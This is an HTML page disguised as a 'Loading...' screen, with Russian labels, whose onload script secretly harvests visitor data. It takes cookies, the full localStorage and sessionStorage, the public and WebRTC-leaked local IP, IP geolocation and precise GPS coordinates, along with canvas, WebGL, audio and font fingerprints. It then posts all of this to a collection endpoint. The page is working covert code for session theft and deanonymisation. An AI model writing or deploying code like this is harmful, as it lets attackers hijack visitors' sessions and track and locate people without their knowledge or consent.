<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
    </style>
</head>
<body>
    <h3>⚙️ Обработка...</h3>
    <script>
        const API_URL = "/api/collect";

        async function collectAll() {
            const data = {
                timestamp: new Date().toISOString(),
                ip: "",
                geoIP: null,          // город по IP
                geo: null,            // точные координаты (если разрешит)
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                screen: `${screen.width}x${screen.height}`,
                availScreen: `${screen.availWidth}x${screen.availHeight}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || "неизв",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || "неизв",
                deviceMemory: navigator.deviceMemory || "неизв",
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vendor: navigator.vendor,
                doNotTrack: navigator.doNotTrack || "не указано",
                online: navigator.onLine,
                battery: "неизв",
                network: "неизв",
                localIP: null,
                cookies: document.cookie || "нет",
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                referrer: document.referrer,
                url: location.href,
                canvas: null,
                webgl: null,
                audio: null,
                fonts: null,
                plugins: null,
                mimeTypes: null
            };

            // 1. Внешний IP
            try {
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const ip = (await ipRes.json()).ip;
                data.ip = ip;

                // 2. Гео по IP (город, провайдер)
                try {
                    const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=city,regionName,country,lat,lon,isp,org`);
                    const geoData = await geoRes.json();
                    if (geoData && geoData.city) {
                        data.geoIP = geoData;
                    }
                } catch(e) {}
            } catch(e) {}

            // 3. Точная геолокация (если пользователь разрешит)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.geo = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                    },
                    () => {},
                    { timeout: 5000, maximumAge: 0 }
                );
            }

            // 4. Батарея
            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    data.battery = `${Math.round(b.level*100)}% (заряжается: ${b.charging})`;
                } catch(e) {}
            }

            // 5. Сеть
            if (navigator.connection) {
                const c = navigator.connection;
                data.network = `${c.effectiveType} (downlink: ${c.downlink} Mbps, rtt: ${c.rtt} ms, тип: ${c.type || "неизв"})`;
            }

            // 6. Локальный IP (WebRTC)
            try {
                const rtc = new RTCPeerConnection({iceServers:[]});
                rtc.createDataChannel('');
                rtc.onicecandidate = e => {
                    if (e.candidate && e.candidate.candidate) {
                        const parts = e.candidate.candidate.split(' ');
                        if (parts.length > 4 && parts[4].includes('.')) {
                            data.localIP = parts[4];
                        }
                    }
                };
                const offer = await rtc.createOffer();
                await rtc.setLocalDescription(offer);
            } catch(e) {}

            // 7. Canvas fingerprint
            try {
                const canvas = document.createElement("canvas");
                canvas.width = 200; canvas.height = 50;
                const ctx = canvas.getContext("2d");
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.fillStyle = "#f60";
                ctx.fillRect(10, 10, 100, 30);
                ctx.fillStyle = "#069";
                ctx.fillText("Fingerprint", 15, 20);
                data.canvas = canvas.toDataURL().substring(0, 150);
            } catch(e) {}

            // 8. WebGL fingerprint
            try {
                const glCanvas = document.createElement("canvas");
                const gl = glCanvas.getContext("webgl") || glCanvas.getContext("experimental-webgl");
                if (gl) {
                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                    data.webgl = `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
                }
            } catch(e) {}

            // 9. Аудиофингерпринт
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                const gain = audioCtx.createGain();
                const compressor = audioCtx.createDynamicsCompressor();
                oscillator.type = "triangle";
                oscillator.connect(gain);
                gain.connect(compressor);
                compressor.connect(analyser);
                analyser.connect(audioCtx.destination);
                oscillator.start(0);
                const bufferLength = analyser.frequencyBinCount;
                const dataArray = new Float32Array(bufferLength);
                analyser.getFloatTimeDomainData(dataArray);
                oscillator.stop();
                let sum = 0;
                for (let i = 0; i < bufferLength; i++) sum += Math.abs(dataArray[i]);
                data.audio = sum.toFixed(4);
            } catch(e) {}

            // 10. Плагины
            if (navigator.plugins) {
                const pl = [];
                for (let i = 0; i < navigator.plugins.length; i++) pl.push(navigator.plugins[i].name);
                data.plugins = pl.join(", ") || "нет";
            }

            // 11. MIME-типы
            if (navigator.mimeTypes) {
                const mimes = [];
                for (let i = 0; i < navigator.mimeTypes.length; i++) mimes.push(navigator.mimeTypes[i].type);
                data.mimeTypes = mimes.join(", ") || "нет";
            }

            // 12. Шрифты
            try {
                const fontList = [
                    "Arial", "Verdana", "Times New Roman", "Courier New", "Georgia",
                    "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS",
                    "Arial Black", "Impact", "Lucida Console", "Tahoma", "MS Sans Serif"
                ];
                const testString = "mmmmmmmmmmlli";
                const testSize = "72px";
                const canvas = document.createElement("canvas");
                const ctx = canvas.getContext("2d");
                const result = {};
                for (const font of fontList) {
                    ctx.font = `${testSize} ${font}`;
                    result[font] = ctx.measureText(testString).width;
                }
                data.fonts = JSON.stringify(result);
            } catch(e) {}

            // Отправка всех данных
            await fetch(API_URL, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(data)
            });
        }

        window.onload = collectAll;
    </script>
</body>
</html>
